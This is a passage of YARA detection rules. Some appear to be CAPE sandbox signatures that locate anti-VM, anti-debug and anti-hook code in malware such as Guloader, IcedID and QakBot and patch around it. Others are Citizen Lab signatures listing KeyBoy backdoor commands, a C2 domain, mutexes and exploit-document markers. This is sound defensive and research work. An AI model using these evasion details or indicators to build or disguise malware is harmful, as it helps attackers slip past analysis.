        hash = "549bca48d0bac94b6a1e6eb36647cd007fed5c0e75a0e4aa315ceabdafe46541"
        hash = "90c29a66209be554dfbd2740f6a54d12616da35d0e5e4af97eb2376b9d053457"
    strings:
        $antivm1 = {57 FF D6 FF D6 BF 01 00 00 00 FF D6 F2 0F 10 0D [4] 47 66 0F 6E C7 F3 0F E6 C0 66 0F 2F C8 73}
        $antivm2 = {F2 0F 11 45 ?? FF 15 [4] 6A 00 68 10 27 00 00 52 50 E8 [4] 8B C8 E8 [4] F2 0F 59 45}
        $antivm3 = {0F 57 C0 E8 [4] 8B 35 [4] BF 01 00 00 00 FF D6 F2 0F 10 0D [4] 47 66 0F 6E C7 F3 0F E6 C0 66 0F 2F C8 73}
        $antivm4 = {F2 0F 11 45 EC FF 15 [4] 8B DA 8B C8 BA [4] 89 5D FC F7 E2 BF [4] 89 45 F4 8B F2 8B C1 B9}
        $antivm5 = {BB 01 00 00 00 8B FB 90 FF 15 [4] FF C7 66 0F 6E C7 F3 0F E6 C0 66 0F 2F F8 73 EA}
        $antivm6 = {48 81 EC 88 00 00 00 0F 57 C0 F2 0F 11 44 [2] F2 0F 10 05 [4] F2 0F 11 44 [2] F2 0F 10 05 [4] F2 0F 11}
    condition:
        any of them
}
rule GuloaderB
{
    meta:
        author = "kevoreilly"
        description = "Guloader bypass 2021 Edition"
        cape_options = "bp0=$trap0,action0=ret,bp1=$trap1,action1=ret:2,bp2=$antihook,action2=goto:ntdll::NtAllocateVirtualMemory,count=0,bp3=$trap2+7,action3=skip"
        packed = "9ec05fd611c2df63c12cc15df8e87e411f358b7a6747a44d4a320c01e3367ca8"
    strings:
        $trap0 = {81 C6 00 10 00 00 [0-88] 81 FE 00 F0 [2] 0F 84 [2] 00 00}
        $trap1 = {31 FF [0-128] (B9|C7 85 F8 00 00 00) 60 5F A9 00}
        $antihook = {FF 34 08 [0-360] 8F 04 0B [0-360] 83 F9 18 [0-460] FF E3}
        $trap2 = {83 BD 9C 00 00 00 00 0F 85 [2] 00 00}
    condition:
        3 of them
}

rule GuloaderPrecursor
{
    meta:
        author = "kevoreilly"
        description = "Guloader precursor"
        cape_options = "bp0=$antidbg,action0=scan,hc0=1,count=0"
    strings:
        $antidbg = {39 48 04 (0F 85 [3] ??|75 ??) 39 48 08 (0F 85 [3] ??|75 ??) 39 48 0C (0F 85 [3] ??|75 ??)}
        $except = {8B 45 08 [0-3] 8B 00 [0-3] 8B 58 18 [0-20] 81 38 05 00 00 C0 0F 85 [4-7] 83 FB 00 (0F 84|74)}
    condition:
        2 of them and not uint16(0) == 0x5A4D
}

rule GuloaderC
{
    meta:
        author = "kevoreilly"
        description = "Guloader bypass 2023 Edition"
        cape_options = "clear,bp0=$trap0,bp0=$trap0A,hc0=0,action0=ret,bp1=$trap1,action1=ret:4,bp2=$antihook,action2=goto:ntdll::NtAllocateVirtualMemory,count=0"
        packed = "d0c1e946f02503a290d24637b5c522145f58372a9ded9e647d24cd904552d235"
        packed = "26760a2ef432470c7fd2d570746b7decdcf34414045906871f33d80ff4dfc6ba"
    strings:
        $antidbg = {39 48 04 0F 85 [4] 39 48 08 0F 85 [4] 39 48 0C 0F 85 [4] 39 48 10 0F 85 [4] 39 48 14 0F 85 [4] 39 48 18 0F 85}
        $except = {8B 45 08 [0-3] 8B 00 [0-3] 8B 58 18 [0-20] 81 38 05 00 00 C0 0F 85 [4-7] 83 FB 00 (0F 84|74)}
        $trap0 = {81 C6 00 10 00 00 [0-148] (39 CE|3B B5) [0-6] 0F 84 [2] 00 00}
        $trap0A = {E8 00 00 00 00 59 [0-2800] 81 C6 00 10 00 00 [0-148] (39 CE|3B B5) [0-6] 0F 84 [2] 00 00}
        $trap1 = {89 D6 60 0F 31 B8 [4] (05|35|2D|B8) [4] (05|35|2D|B8) [4] (05|35|2D|B8) [4] 0F A2}
        $antihook = {FF 34 08 [0-360] 8F 04 0B [0-800] FF E3}
    condition:
        3 of them
}
rule IcedIDSyscallWriteMem
{
    meta:
        author = "kevoreilly"
        description = "IcedID 'syscall' packer bypass - direct write variant"
        cape_options = "bp0=$tokencheck+9,action0=jmp,count=0"
        packed = "28075ecae5e224c06e250f2c949c826b81844bca421e9158a7a9e965a29ef894"
        packed = "045dff9f14a03225df55997cb2ca74ff60ecaf317b9e033ea93386785db84161"
    strings:
        $tokencheck = {39 5D ?? 75 06 83 7D ?? 03 74 05 BB 01 00 00 00 41 89 1C ?? 48 8B 4D ?? 41 FF D?}
    condition:
        uint16(0) == 0x5A4D and all of them
}

rule IcedIDHook
{
    meta:
        author = "kevoreilly"
        description = "IcedID hook fix"
        cape_options = "ntdll-protect=0"
    strings:
        $hook = {C6 06 E9 83 E8 05 89 46 01 8D 45 ?? 50 FF 75 ?? 6A 05 56 6A FF E8 2D FA FF FF}
    condition:
        any of them
}

rule IcedIDPackerA
{
    meta:
        author = "kevoreilly"
        description = "IcedID export selection"
        cape_options = "export=$export"
        hash = "fbad60002286599ca06d0ecb3624740efbf13ee5fda545341b3e0bf4d5348cfe"
    strings:
        $init = "init"
        $export = {48 89 5C 24 08 48 89 6C 24 10 48 89 74 24 18 57 48 81 EC [2] 00 00 41 8B E9 49 8B F0 48 8B FA 48 8B D9}
        $alloc = {8B 50 50 33 C9 44 8D 49 40 41 B8 00 30 00 00 FF 15 [4] 48 89 44 24 28 [0-3] 48 89 84 24 ?? 00 00 00 E9}
    condition:
        uint16(0) == 0x5A4D and all of them
}

rule IcedIDPackerB
{
    meta:
        author = "kevoreilly"
        description = "IcedID export selection"
        cape_options = "export=$export"
        hash = "6517ef2c579002ec62ddeb01a3175917c75d79ceca355c415a4462922c715cb6"
    strings:
        $init = "init"
        $export = {44 89 4C 24 20 4C 89 44 24 18 48 89 4C 24 08 41 55 41 56 41 57 48 81 EC ?? 00 00 00 B9 [2] 00 00 4C 8B EA E8}
        $loop = {8B C2 48 8D 49 01 83 E0 07 FF C2 0F B6 44 30 ?? 30 41 FF 3B D5 72}
        //$load = {41 FF D7 33 D2 41 B8 00 80 00 00 49 8B CF FF 54}
    condition:
        uint16(0) == 0x5A4D and all of them
}

rule IcedIDPackerC
{
    meta:
        author = "kevoreilly"
        description = "IcedID export selection"
        cape_options = "export=$export"
        hash = "c06805b6efd482c1a671ec60c1469e47772c8937ec0496f74e987276fa9020a5"
        hash = "265c1857ac7c20432f36e3967511f1be0b84b1c52e4867889e367c0b5828a844"
    strings:
        $export = {44 89 4C 24 20 4C 89 44 24 18 48 89 54 24 10 3A ED 74}
        $alloc = {41 B8 00 10 00 00 8B D0 33 C9 66 3B ?? (74|0F 84)}
    condition:
        uint16(0) == 0x5A4D and all of them
}

rule IcedIDPackerD
{
    meta:
        author = "kevoreilly"
        description = "IcedID export selection"
        cape_options = "export=$export"
        hash = "7b226f8cc05fa7d846c52eb0ec386ab37f9bae04372372509daa6bacc9f885d8"
    strings:
        $init = "init"
        $export = {44 89 4C 24 20 4C 89 44 24 18 48 89 54 24 10 66 3B ED 74}
        $load = {41 B8 00 80 00 00 33 D2 48 8B 4C [2] EB ?? B9 69 04 00 00 E8 [4] 48 89 84 [2] 00 00 00 66 3B ED 74}
    condition:
        uint16(0) == 0x5A4D and all of them
}
rule MysterySnail
{
    meta:
        author = "kevoreilly"
        description = "MysterySnail anti-sandbox bypass"
        cape_options = "bp0=$anti+62,action0=skip,count=0"
    strings:
        $anti = {F2 0F 10 [3] 66 0F 2F 05 [4] 76 0A 8B [3] FF C0 89 [3] B9 5B 05 00 00 FF 15 [4] E8 [4] 89 [3] 8B [3] 8B [3] 2B C8 8B C1 3B [3] 7E 16}
    condition:
        any of them
}
rule NSIS
{
    meta:
        author = "kevoreilly"
        description = "NSIS Integrity Check function"
        cape_options = "exclude-apis=LdrLoadDll"
        hash = "d0c1e946f02503a290d24637b5c522145f58372a9ded9e647d24cd904552d235"
    strings:
        $check = {6A 1C 8D 45 [3-8] E8 [4] 8B 45 ?? A9 F0 FF FF FF 75 ?? 81 7D ?? EF BE AD DE 75 ?? 81 7D ?? 49 6E 73 74 75 ?? 81 7D ?? 73 6F 66 74 75 ?? 81 7D ?? 4E 75 6C 6C 75 ?? 09 45 08 8B 45 08 8B 0D [4] 83 E0 02 09 05 [4] 8B 45 ?? 3B C6 89 0D [4] 0F 8? [2] 00 00 F6 45 08 08 75 06 F6 45 08 04 75}
    condition:
        uint16(0) == 0x5A4D and all of them
}
rule Pafish
{
    meta:
        author = "kevoreilly"
        description = "Pafish bypass"
        cape_options = "bp0=$rdtsc_vmexit_32-2,bp1=$rdtsc_vmexit_32-2,bp0=$rdtsc_vmexit_64+36,bp1=$rdtsc_vmexit_64+36,action0=skip,action1=skip,count=1"
        hash = "9e7d694ed87ae95f9c25af5f3a5cea76188cd7c1c91ce49c92e25585f232d98e"
        hash = "ff24b9da6cddd77f8c19169134eb054130567825eee1008b5a32244e1028e76f"
    strings:
        $rdtsc_vmexit_32 = {8B 45 E8 80 F4 00 89 C? 8B 45 EC 80 F4 00 89 C? 89 F? 09 ?? 85 C0 75 07}
        $rdtsc_vmexit_64 = {48 8B 45 F0 48 BA CD CC CC CC CC CC CC CC 48 F7 E2 48 89 D0 48 C1 E8 03 48 89 45 F0 48 81 7D F0 ?? 0? 00 00 77 07}
    condition:
        uint16(0) == 0x5A4D and any of them
}
rule QakBot
{
    meta:
        author = "kevoreilly"
        description = "QakBot Config Extraction"
        cape_options = "bp0=$params+23,action0=setdump:eax::ecx,bp1=$c2list1+40,bp1=$c2list2+38,action1=dump,bp2=$conf+13,action2=dump,count=1,typestring=QakBot Config"
        packed = "f084d87078a1e4b0ee208539c53e4853a52b5698e98f0578d7c12948e3831a68"
    strings:
        $params = {8B 7D ?? 8B F1 57 89 55 ?? E8 [4] 8D 9E [2] 00 00 89 03 59 85 C0 75 08 6A FC 58 E9}
        $c2list1 = {59 59 8D 4D D8 89 45 E0 E8 [4] 8B 45 E0 85 C0 74 ?? 8B 90 [2] 00 00 51 8B 88 [2] 00 00 6A 00 E8}
        $c2list2 = {59 59 8B F8 8D 4D ?? 89 7D ?? E8 [4] 85 FF 74 52 8B 97 [2] 00 00 51 8B 8F [2] 00 00 53 E8}
        $conf = {5F 5E 5B C9 C3 51 6A 00 E8 [4] 59 59 85 C0 75 01 C3}
    condition:
        uint16(0) == 0x5A4D and any of them
}

rule QakBotLoader
{
    meta:
        author = "kevoreilly"
        description = "QakBot Export Selection"
        cape_options = "export=$export1,export=$export2,export=$export3"
        hash = "6f99171c95a8ed5d056eeb9234dbbee123a6f95f481ad0e0a966abd2844f0e1a"
    strings:
        $export1 = {55 8B EC 83 EC 50 (3A|66 3B) ?? 74}
        $export2 = {55 8B EC 3A ?? 74 [8-16] 74 [6-16] EB}
        $export3 = {55 8B EC 66 3B ?? 74 [3-5] 74}
        $wind = {(66 3B|3A) ?? 74 [1-14] BB 69 04 00 00 53 E? [5-20] 74}
        $getteb = {EB 00 55 8B EC 66 3B E4 74 ?? [1-5] 64 A1 18 00 00 00 5D EB}
    condition:
        uint16(0) == 0x5A4D and (any of ($export*)) and ($wind or $getteb)
}

rule QakBotAntiVM
{
    meta:
        author = "kevoreilly"
        description = "QakBot AntiVM bypass"
        cape_options = "bp0=$antivm1,action0=unwind,count=1"
        hash = "e269497ce458b21c8427b3f6f6594a25d583490930af2d3395cb013b20d08ff7"
    strings:
        $antivm1 = {55 8B EC 3A E4 0F [2] 00 00 00 6A 04 58 3A E4 0F [2] 00 00 00 C7 44 01 [5] 81 44 01 [5] 66 3B FF 74 ?? 6A 04 58 66 3B ED 0F [2] 00 00 00 C7 44 01 [5] 81 6C 01 [5] EB}
    condition:
        all of them
}
rule RdtscpAntiVM
{
    meta:
        author = "kevoreilly"
        description = "RdtscpAntiVM bypass"
        cape_options = "nop-rdtscp=1"
    strings:
        $antivm = {46 0F 01 F9 [0-4] 66 0F 6E C6 F3 0F E6 C0 66 0F 2F ?? 73}
    condition:
        any of them
}
rule Rhadamanthys
{
    meta:
        author = "kevoreilly"
        cape_options = "bp0=$conf-11,hc0=1,action0=setdump:edx::ebx,bp1=$conf+64,hc1=1,action1=dump,count=0,typestring=Rhadamanthys Config,ntdll-protect=0"
        packed = "9e28586ab70b1abdccfe087d81e326a0703f75e9551ced187d37c51130ad02f5"
    strings:
        $rc4 = {88 4C 01 08 41 81 F9 00 01 00 00 7C F3 89 75 08 33 FF 8B 4D 08 3B 4D 10 72 04 83 65 08 00}
        $code = {8B 4D FC 3B CF 8B C1 74 0D 83 78 04 02 74 1C 8B 40 1C 3B C7 75 F3 3B CF 8B C1 74 57 83 78 04 17 74 09 8B 40 1C 3B C7 75 F3 EB}
        $conf = {46 BB FF 00 00 00 23 F3 0F B6 44 31 08 03 F8 23 FB 0F B6 5C 39 08 88 5C 31 08 88 44 39 08 02 C3 8B 5D 08 0F B6 C0 8A 44 08 08}
    condition:
        2 of them
}
rule SingleStepAntiHook
{
    meta:
        author = "kevoreilly"
        description = "Single-step anti-hook Bypass"
        cape_options = "bp0=$antihook+6,action0=skip,count=0"
    strings:
        $antihook = {FF D? 83 EC 08 9C 81 0C 24 00 01 00 00 9D}
    condition:
        any of them
}
rule SmokeLoader
{
    meta:
        author = "kevoreilly"
        description = "SmokeLoader Payload"
        cape_options = "bp0=$gate+19,action0=DumpSectionViews,count=1"
    strings:
        $gate = {68 [2] 00 00 50 E8 [4] 8B 45 ?? 89 F1 8B 55 ?? 9A [2] 40 00 33 00 89 F9 89 FA 81 C1 [2] 00 00 81 C2 [2] 00 00 89 0A 8B 46 ?? 03 45 ?? 8B 4D ?? 8B 55 ?? 9A [2] 40 00 33 00}
    condition:
        uint16(0) == 0x5A4D and any of them
}
rule Stealc
{
    meta:
        author = "kevoreilly"
        description = "Stealc detonation bypass"
        cape_options = "bp0=$anti+17,action0=skip,count=1"
        hash = "77d6f1914af6caf909fa2a246fcec05f500f79dd56e5d0d466d55924695c702d"
    strings:
        $anti = {53 57 57 57 FF 15 [4] 8B F0 74 03 75 01 B8 E8 [4] 74 03 75 01 B8}
        $decode = {6A 03 33 D2 8B F8 59 F7 F1 8B C7 85 D2 74 04 2B C2 03 C1 6A 06 C1 E0 03 33 D2 59 F7 F1}
    condition:
        uint16(0) == 0x5A4D and all of them
}
rule Syscall
{
    meta:
        author = "kevoreilly"
        description = "x64 syscall instruction (direct)"
        cape_options = "clear,dump,sysbp=$syscall0+8,sysbp=$syscallA+10,sysbp=$syscallB+7,sysbp=$syscallC+18"
    strings:
        $syscall0 = {4C 8B D1 B8 [2] 00 00 (0F 05|FF 25 ?? ?? ?? ??) C3}    // mov eax, X
        $syscallA = {4C 8B D1 66 8B 05 [4] (0F 05|FF 25 ?? ?? ?? ??) C3}    // mov ax, [p]
        $syscallB = {4C 8B D1 66 B8 [2] (0F 05|FF 25 ?? ?? ?? ??) C3}       // mov ax, X
        $syscallC = {4C 8B D1 B8 [2] 00 00 [10] 0F 05 C3}
    condition:
        any of them
}
rule UPX
{
    meta:
        author = "kevoreilly"
        description = "UPX dump on OEP (original entry point)"
        cape_options = "bp0=$upx32+9,bp0=$upx64+11,action0=step2oep"
    strings:
        $upx32 = {6A 00 39 C4 75 FA 83 EC ?? E9}
        $upx64 = {6A 00 48 39 C4 75 F9 48 83 EC ?? E9}
    condition:
        uint16(0) == 0x5A4D and any of them
}
rule UrsnifV3
{
    meta:
        author = "kevoreilly"
        description = "Ursnif Config Extraction"
        cape_options = "br0=$crypto32_1-48,action1=dump:ebx::eax,bp2=$crypto32_3+50,action2=dump:ebx::eax,bp3=$crypto32_4+11,action3=dump:eax::ecx,typestring=UrsnifV3 Config,count=1"
        packed = "75827be0c600f93d0d23d4b8239f56eb8c7dc4ab6064ad0b79e6695157816988"
        packed = "5d6f1484f6571282790d64821429eeeadee71ba6b6d566088f58370634d2c579"
    strings:
        $crypto32_1 = {8B C3 83 EB 01 85 C0 75 0D 0F B6 16 83 C6 01 89 74 24 14 8D 58 07 8B C2 C1 E8 07 83 E0 01 03 D2 85 C0 0F 84 AB 01 00 00 8B C3 83 EB 01 85 C0 89 5C 24 20 75 13 0F B6 16 83 C6 01 BB 07 00 00 00}
        $crypto32_3 = {F6 46 03 02 75 5? 8B 46 10 40 50 E8 [4] 8B D8 89 5C 24 1C 85 DB 74 41 F6 46 03 01 74 53 8B 46 10 89 44 24 1C 8B 46 0C 53 03 C7 E8 [4] 59}
        $crypto32_4 = {C7 44 24 10 01 00 00 00 8B 4E 10 C6 04 08 00 8B 4D ?? 89 01 8B 46 ?? 8B 4D ?? 89 01 8B 44 24 10 5F 5E 5B 8B E5 5D C2 0C 00}
        $cpuid = {8B C4 FF 18 8B F0 33 C0 0F A2 66 8C D8 66 8E D0 8B E5 8B C6 5E 5B 5D C3}
    condition:
        any of ($crypto32*) and $cpuid
}
rule VBCrypter
{
    meta:
        author = "kevoreilly"
        description = "VBCrypter anti-hook Bypass"
        cape_options = "bp0=$antihook-12,action0=jmp,count=0"
    strings:
        $antihook = {43 39 C3 0F 84 ?? 00 00 00 80 3B B8 75 ?? 83 7B 01 00 75 ?? 80 7B 05 BA 75 ?? 8B 53 06 83 C3 0A 31 C9}
    condition:
        any of them
}
rule Zloader
{
    meta:
        author = "kevoreilly"
        description = "Zloader API Spam Bypass"
        cape_options = "bp0=$trap1-5,action0=hooks:0,bp1=$traps-108,action1=jmp:15,bp2=$traps-88,action2=hooks:1,count=0"
    strings:
        $trap1 = {81 F7 4C 01 00 00 8D B4 37 [2] FF FF 31 FE 69 FE 95 03 00 00 E8 [4] 31 FE 0F AF FE 0F AF FE E8}
        $traps = {6A 44 53 E8 [2] FF FF 83 C4 08 8D 85 ?? FF FF FF C7 85 ?? FF FF FF 44 00 00 00 50}
    condition:
        uint16(0) == 0x5A4D and any of them
}
import "pe"

/*
*
* This section of the rules are all specific to the new 2016
* KeyBoy sample targeting the Tibetan community. Other following
* sections capture file characteristics observed across multiple
* years of development. Don't miss the exploit doc signatures
* at the very end.
*
*/
rule new_keyboy_export
{
    meta:
        author = "Matt Brooks, @cmatthewbrooks"
        desc = "Matches the new 2016 sample's export"
        date = "2016-08-28"
        md5 = "495adb1b9777002ecfe22aaf52fcee93"

    condition:
        //MZ header
        uint16(0) == 0x5A4D and

        //PE signature
        uint32(uint32(0x3C)) == 0x00004550 and


        filesize < 200KB and


        //The malware family seems to share many exports
        //but this is the new kid on the block.
        pe.exports("cfsUpdate")
}


rule new_keyboy_header_codes
{
    meta:
        author = "Matt Brooks, @cmatthewbrooks"
        desc = "Matches the 2016 sample's header codes"
        date = "2016-08-28"
        md5 = "495adb1b9777002ecfe22aaf52fcee93"

    strings:
        $s1 = "*l*" wide fullword
        $s2 = "*a*" wide fullword
        $s3 = "*s*" wide fullword
        $s4 = "*d*" wide fullword
        $s5 = "*f*" wide fullword
        $s6 = "*g*" wide fullword
        $s7 = "*h*" wide fullword

    condition:
        //MZ header
        uint16(0) == 0x5A4D and

        //PE signature
        uint32(uint32(0x3C)) == 0x00004550 and


        filesize < 200KB and


        all of them
}


/*
*
* This section of the rules are all broader and will hit on
* older KeyBoy samples and other samples possibly part of a
* a larger development effort.
*
*/

rule keyboy_commands
{
    meta:
        author = "Matt Brooks, @cmatthewbrooks"
        desc = "Matches the 2016 sample's sent and received commands"
        date = "2016-08-28"
        md5 = "495adb1b9777002ecfe22aaf52fcee93"

    strings:
        $s1 = "Update" wide fullword
        $s2 = "UpdateAndRun" wide fullword
        $s3 = "Refresh" wide fullword
        $s4 = "OnLine" wide fullword
        $s5 = "Disconnect" wide fullword
        $s6 = "Pw_Error" wide fullword
        $s7 = "Pw_OK" wide fullword
        $s8 = "Sysinfo" wide fullword
        $s9 = "Download" wide fullword
        $s10 = "UploadFileOk" wide fullword
        $s11 = "RemoteRun" wide fullword
        $s12 = "FileManager" wide fullword

    condition:
        //MZ header
        uint16(0) == 0x5A4D and

        //PE signature
        uint32(uint32(0x3C)) == 0x00004550 and


        filesize < 200KB and


        6 of them
}

rule keyboy_errors
{
    meta:
        author = "Matt Brooks, @cmatthewbrooks"
        desc = "Matches the sample's shell error2 log statements"
        date = "2016-08-28"
        md5 = "495adb1b9777002ecfe22aaf52fcee93"

    strings:
        //These strings are in ASCII pre-2015 and UNICODE in 2016
        $error = "Error2" ascii wide
        //2016 specific:
        $s1 = "Can't find [%s]!Check the file name and try again!" ascii wide
        $s2 = "Open [%s] error! %d" ascii wide
        $s3 = "The Size of [%s] is zero!" ascii wide
        $s4 = "CreateThread DownloadFile[%s] Error!" ascii wide
        $s5 = "UploadFile [%s] Error:Connect Server Failed!" ascii wide
        $s6 = "Receive [%s] Error(Recved[%d] != Send[%d])!" ascii wide
        $s7 = "Receive [%s] ok! Use %2.2f seconds, Average speed %2.2f k/s" ascii wide
        $s8 = "CreateThread UploadFile[%s] Error!" ascii wide
        //Pre-2016:
        $s9 = "Ready Download [%s] ok!" ascii wide
        $s10 = "Get ControlInfo from FileClient error!" ascii wide
        $s11 = "FileClient has a error!" ascii wide
        $s12 = "VirtualAlloc SendBuff Error(%d)" ascii wide
        $s13 = "ReadFile [%s] Error(%d)..." ascii wide
        $s14 = "ReadFile [%s] Data[Readed(%d) != FileSize(%d)] Error..." ascii wide
        $s15 = "CreateThread DownloadFile[%s] Error!" ascii wide
        $s16 = "RecvData MyRecv_Info Size Error!" ascii wide
        $s17 = "RecvData MyRecv_Info Tag Error!" ascii wide
        $s18 = "SendData szControlInfo_1 Error!" ascii wide
        $s19 = "SendData szControlInfo_3 Error!" ascii wide
        $s20 = "VirtualAlloc RecvBuff Error(%d)" ascii wide
        $s21 = "RecvData Error!" ascii wide
        $s22 = "WriteFile [%s} Error(%d)..." ascii wide

    condition:
        //MZ header
        uint16(0) == 0x5A4D and

        //PE signature
        uint32(uint32(0x3C)) == 0x00004550 and


        filesize < 200KB and


        $error and 3 of ($s*)
}


rule keyboy_systeminfo
{
    meta:
        author = "Matt Brooks, @cmatthewbrooks"
        desc = "Matches the system information format before sending to C2"
        date = "2016-08-28"
        md5 = "495adb1b9777002ecfe22aaf52fcee93"

    strings:
        //These strings are ASCII pre-2015 and UNICODE in 2016
        $s1 = "SystemVersion:    %s" ascii wide
        $s2 = "Product  ID:      %s" ascii wide
        $s3 = "InstallPath:      %s" ascii wide
        $s4 = "InstallTime:      %d-%d-%d, %02d:%02d:%02d" ascii wide
        $s5 = "ResgisterGroup:   %s" ascii wide
        $s6 = "RegisterUser:     %s" ascii wide
        $s7 = "ComputerName:     %s" ascii wide
        $s8 = "WindowsDirectory: %s" ascii wide
        $s9 = "System Directory: %s" ascii wide
        $s10 = "Number of Processors:       %d" ascii wide
        $s11 = "CPU[%d]:  %s: %sMHz" ascii wide
        $s12 = "RAM:         %dMB Total, %dMB Free." ascii wide
        $s13 = "DisplayMode: %d x %d, %dHz, %dbit" ascii wide
        $s14 = "Uptime:      %d Days %02u:%02u:%02u" ascii wide



    condition:
        //MZ header
        uint16(0) == 0x5A4D and

        //PE signature
        uint32(uint32(0x3C)) == 0x00004550 and


        filesize < 200KB and


        7 of them
}


rule keyboy_related_exports
{
    meta:
        author = "Matt Brooks, @cmatthewbrooks"
        desc = "Matches the new 2016 sample's export"
        date = "2016-08-28"
        md5 = "495adb1b9777002ecfe22aaf52fcee93"

    condition:
        //MZ header
        uint16(0) == 0x5A4D and

        //PE signature
        uint32(uint32(0x3C)) == 0x00004550 and


        filesize < 200KB and


        //The malware family seems to share many exports
        //but this is the new kid on the block.
        pe.exports("Embedding") or
        pe.exports("SSSS") or
        pe.exports("GetUP")
}

// Note: The use of the .Init section has been observed in nearly
// all samples with the exception of the 2013 VN dropper from the
// Rapid7 blog. The config data was stored in that sample's .data
// section.
rule keyboy_init_config_section
{
    meta:
        author = "Matt Brooks, @cmatthewbrooks"
        desc = "Matches the Init section where the config is stored"
        date = "2016-08-28"

    condition:
        //MZ header
        uint16(0) == 0x5A4D and

        //PE signature
        uint32(uint32(0x3C)) == 0x00004550 and


        //Payloads are normally smaller but the new dropper we spotted
        //is a bit larger.
        filesize < 300KB and


        //Observed virtual sizes of the .Init section vary but they've
        //always been 1024, 2048, or 4096 bytes.
        for any i in (0..pe.number_of_sections - 1):
            (
                pe.sections[i].name == ".Init" and
                pe.sections[i].virtual_size % 1024 == 0
            )
}


/*
*
* These signatures fire on the exploit documents used in this
* operation.
*
*/
rule CVE_2012_0158_KeyBoy {
  meta:
      author = "Etienne Maynier <etienne@citizenlab.ca>"
      description = "CVE-2012-0158 variant"
      file = "8307e444cad98b1b59568ad2eba5f201"


  strings:
      $a = "d0cf11e0a1b11ae1000000000000000000000000000000003e000300feff09000600000000000000000000000100000001" nocase // OLE header
      $b = "ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff" nocase // junk data
      $c = /5(\{\\b0\}|)[ ]*2006F00(\{\\b0\}|)[ ]*6F007(\{\\b0\}|)[ ]*400200045(\{\\b0\}|)[ ]*006(\{\\b0\}|)[ ]*E007(\{\\b0\}|)[ ]*400720079/ nocase
      $d = "MSComctlLib.ListViewCtrl.2"
      $e = "ac38c874503c307405347aaaebf2ac2c31ebf6e8e3" nocase //decoding shellcode


  condition:
      all of them
}
rule dubseven_file_set
{
    meta:
        author = "Matt Brooks, @cmatthewbrooks"
        desc = "Searches for service files loading UP007"

    strings:
        $file1 = "\\Microsoft\\Internet Explorer\\conhost.exe"
        $file2 = "\\Microsoft\\Internet Explorer\\dll2.xor"
        $file3 = "\\Microsoft\\Internet Explorer\\HOOK.DLL"
        $file4 = "\\Microsoft\\Internet Explorer\\main.dll"
        $file5 = "\\Microsoft\\Internet Explorer\\nvsvc.exe"
        $file6 = "\\Microsoft\\Internet Explorer\\SBieDll.dll"
        $file7 = "\\Microsoft\\Internet Explorer\\mon"
        $file8 = "\\Microsoft\\Internet Explorer\\runas.exe"

    condition:
        //MZ header
        uint16(0) == 0x5A4D and

        //PE signature
        uint32(uint32(0x3C)) == 0x00004550 and

        //Just a few of these as they differ
        3 of ($file*)
}

rule dubseven_dropper_registry_checks
{
    meta:
        author = "Matt Brooks, @cmatthewbrooks"
        desc = "Searches for registry keys checked for by the dropper"

    strings:
        $reg1 = "SOFTWARE\\360Safe\\Liveup"
        $reg2 = "Software\\360safe"
        $reg3 = "SOFTWARE\\kingsoft\\Antivirus"
        $reg4 = "SOFTWARE\\Avira\\Avira Destop"
        $reg5 = "SOFTWARE\\rising\\RAV"
        $reg6 = "SOFTWARE\\JiangMin"
        $reg7 = "SOFTWARE\\Micropoint\\Anti-Attack"

    condition:
        //MZ header
        uint16(0) == 0x5A4D and

        //PE signature
        uint32(uint32(0x3C)) == 0x00004550 and

        all of ($reg*)
}

rule dubseven_dropper_dialog_remains
{
    meta:
        author = "Matt Brooks, @cmatthewbrooks"
        desc = "Searches for related dialog remnants. How rude."

    strings:
        $dia1 = "fuckMessageBox 1.0" wide
        $dia2 = "Rundll 1.0" wide

    condition:
        //MZ header
        uint16(0) == 0x5A4D and

        //PE signature
        uint32(uint32(0x3C)) == 0x00004550 and

        any of them
}


rule maindll_mutex
{
    meta:
        author = "Matt Brooks, @cmatthewbrooks"
        desc = "Matches on the maindll mutex"

    strings:
        $mutex = "h31415927tttt"

    condition:
        //MZ header
        uint16(0) == 0x5A4D and

        //PE signature
        uint32(uint32(0x3C)) == 0x00004550 and

        $mutex
}


rule SLServer_dialog_remains
{
    meta:
        author = "Matt Brooks, @cmatthewbrooks"
        desc = "Searches for related dialog remnants."

    strings:
        $slserver = "SLServer" wide

    condition:
        //MZ header
        uint16(0) == 0x5A4D and

        //PE signature
        uint32(uint32(0x3C)) == 0x00004550 and

        $slserver
}

rule SLServer_mutex
{
    meta:
        author = "Matt Brooks, @cmatthewbrooks"
        desc = "Searches for the mutex."

    strings:
        $mutex = "M&GX^DSF&DA@F"

    condition:
        //MZ header
        uint16(0) == 0x5A4D and

        //PE signature
        uint32(uint32(0x3C)) == 0x00004550 and

        $mutex
}

rule SLServer_command_and_control
{
    meta:
        author = "Matt Brooks, @cmatthewbrooks"
        desc = "Searches for the C2 server."

    strings:
        $c2 = "safetyssl.security-centers.com"

    condition:
        //MZ header
        uint16(0) == 0x5A4D and

        //PE signature
        uint32(uint32(0x3C)) == 0x00004550 and

        $c2
}

rule SLServer_campaign_code
{
    meta:
        author = "Matt Brooks, @cmatthewbrooks"
        desc = "Searches for the related campaign code."

    strings:
        $campaign = "wthkdoc0106"

    condition:
        //MZ header
        uint16(0) == 0x5A4D and

        //PE signature
        uint32(uint32(0x3C)) == 0x00004550 and

        $campaign
}

rule SLServer_unknown_string
{
    meta:
        author = "Matt Brooks, @cmatthewbrooks"
        desc = "Searches for a unique string."

    strings:
        $string = "test-b7fa835a39"

    condition:
        //MZ header
        uint16(0) == 0x5A4D and

        //PE signature
        uint32(uint32(0x3C)) == 0x00004550 and

        $string
}



rule PSS_Agent {
    meta:
        description = "PSS Agent versions 4.x and 5.x"
        author = "Geoffrey Alexander <geoff@citizenlab.ca>"
        date = "2017-07-20"

    strings:
        $cmdproc = "CmdProc_" wide

        $u1 = "SS_Agent" ascii
        $u2 = "pss-agent" ascii
        $u3 = "DC615DA9-94B5-4477-9C33-3A393BC9E63F" ascii
        $u4 = { 06 1f 41 49 4d 48 50 4f 31 }

        $s1 = "util::Process::" ascii
        $s2 = "util::Resource::" ascii
        $s3 = "util::System::" ascii
        $s4 = "/M:{0FA12518-0120-0910-A43C-0DAA276D2EA4}" wide
        $s5 = "Command is not allowed due to potential detection threat: %1%." wide
